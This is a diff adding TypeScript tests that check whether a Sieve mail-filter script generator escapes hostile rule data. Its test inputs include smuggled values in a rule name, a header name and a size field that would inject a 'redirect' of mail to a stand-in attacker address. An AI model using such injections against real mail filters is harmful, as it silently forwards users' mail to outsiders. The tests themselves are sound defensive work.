@@ -574,3 +574,56 @@ describe('generateScript', () => {
     });
   });
 });
+
+describe('generateScript with hostile rule data', () => {
+  /** The script with every comment removed: what Sieve actually executes. */
+  function commands(script: string): string {
+    return script.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*#.*$/gm, '');
+  }
+
+  it('writes a rule name on one line with its whitespace collapsed', () => {
+    const script = generateScript([makeRule({ name: 'Foo  Bar\nredirect "x@evil.example";' })]);
+    expect(script).toContain('# Rule: Foo Bar redirect "x@evil.example";\n');
+    expect(script).not.toMatch(/^redirect/m);
+    expect(commands(script)).not.toContain('x@evil.example');
+  });
+
+  it('escapes a custom header name', () => {
+    const script = generateScript([makeRule({
+      conditions: [{ field: 'header', headerName: 'X-A" :contains "B', comparator: 'contains', value: 'v' }],
+    })]);
+    expect(script).toContain('header :contains "X-A\\" :contains \\"B" "v"');
+  });
+
+  it('writes only a number with an optional K/M/G as a size, else 0', () => {
+    const size = (value: string) => generateScript([makeRule({
+      conditions: [{ field: 'size', comparator: 'greater_than', value }],
+    })]);
+    expect(size('10M')).toContain('size :over 10M');
+    expect(size('1; redirect "x@evil.example"')).toContain('size :over 0');
+    expect(commands(size('1 { redirect "x@evil.example"; } if true'))).not.toContain('x@evil.example');
+  });
+
+  // Generated from the code before the escaping change: green on both sides by design.
+  it('leaves a plain script byte-identical', () => {
+    const script = generateScript([
+      makeRule({
+        id: 'r1',
+        name: 'Newsletter Filter',
+        conditions: [{ field: 'from', comparator: 'contains', value: 'news@example.com' }],
+        actions: [{ type: 'move', value: 'Newsletters' }],
+        stopProcessing: true,
+      }),
+      makeRule({
+        id: 'r2',
+        name: 'Spam And Big',
+        conditions: [
+          { field: 'header', headerName: 'X-Spam-Flag', comparator: 'contains', value: 'YES' },
+          { field: 'size', comparator: 'greater_than', value: '10M' },
+        ],
+        actions: [{ type: 'mark_read' }],
+      }),
+    ]);
+    expect(script).toBe("/* @metadata:begin\n{\"version\":1,\"rules\":[{\"id\":\"r1\",\"name\":\"Newsletter Filter\",\"enabled\":true,\"matchType\":\"all\",\"conditions\":[{\"field\":\"from\",\"comparator\":\"contains\",\"value\":\"news@example.com\"}],\"actions\":[{\"type\":\"move\",\"value\":\"Newsletters\"}],\"stopProcessing\":true},{\"id\":\"r2\",\"name\":\"Spam And Big\",\"enabled\":true,\"matchType\":\"all\",\"conditions\":[{\"field\":\"header\",\"headerName\":\"X-Spam-Flag\",\"comparator\":\"contains\",\"value\":\"YES\"},{\"field\":\"size\",\"comparator\":\"greater_than\",\"value\":\"10M\"}],\"actions\":[{\"type\":\"mark_read\"}],\"stopProcessing\":false}]}\n@metadata:end */\n\nrequire [\"fileinto\", \"imap4flags\"];\n\n# Rule: Newsletter Filter\nif header :contains \"From\" \"news@example.com\" {\n    fileinto \"Newsletters\";\n    stop;\n}\n\n# Rule: Spam And Big\nif allof(header :contains \"X-Spam-Flag\" \"YES\", size :over 10M) {\n    addflag \"\\\\Seen\";\n}\n");
+  });
+});
